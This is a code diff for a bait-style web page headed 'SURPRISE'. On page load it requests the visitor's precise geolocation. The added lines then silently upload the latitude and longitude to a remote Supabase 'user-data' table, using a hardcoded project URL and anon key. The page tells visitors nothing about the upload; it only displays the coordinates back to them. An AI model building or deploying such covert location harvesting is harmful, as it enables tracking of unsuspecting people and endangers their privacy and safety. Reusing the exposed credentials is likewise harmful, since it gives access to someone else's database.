@@ -10,15 +10,15 @@
     <!-- Big headline "SURPRISE" -->
     <h1 style="font-size: 4em; text-align: center;">SURPRISE</h1>
 
-    <!-- Commented out the iframe section -->
-    <!-- 
-    <iframe src="/Jeeto%20Pakistan.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1;"></iframe>
-    -->
-    
     <p id="geolocation-status"></p>
     <p id="geolocation-result"></p>
 
     <script>
+        // Initialize Supabase
+        const SUPABASE_URL = "https://xsibckeasnitdilcdzoe.supabase.co"; // Replace with your Supabase URL
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE"; // Replace with your Supabase anon key
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
         // Function to request geolocation permission and fetch location
         async function getGeolocation() {
             if (navigator.geolocation) {
@@ -29,6 +29,14 @@
                         document.getElementById("geolocation-status").innerText = "Location fetched successfully!";
                         document.getElementById("geolocation-result").innerText = 
                             `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                        // Send the geolocation data to Supabase
+                        const result = await sendDataToSupabase({ latitude, longitude });
+                        if (result.error) {
+                            console.error("Error sending data to Supabase:", result.error);
+                        } else {
+                            console.log("Data successfully stored in Supabase:", result);
+                        }
                     },
                     showError,
                     { enableHighAccuracy: true, timeout: 10000 }
@@ -56,6 +64,19 @@
             }
             document.getElementById("geolocation-status").innerText = `Error: ${message}`;
             console.error("Geolocation error:", message);
+        }
+
+        // Function to send data to Supabase
+        async function sendDataToSupabase(data) {
+            try {
+                const { error } = await supabase.from("user-data").insert([{
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                }]);
+                return { error };
+            } catch (err) {
+                return { error: err.message };
+            }
         }
 
         // Trigger geolocation request on page load
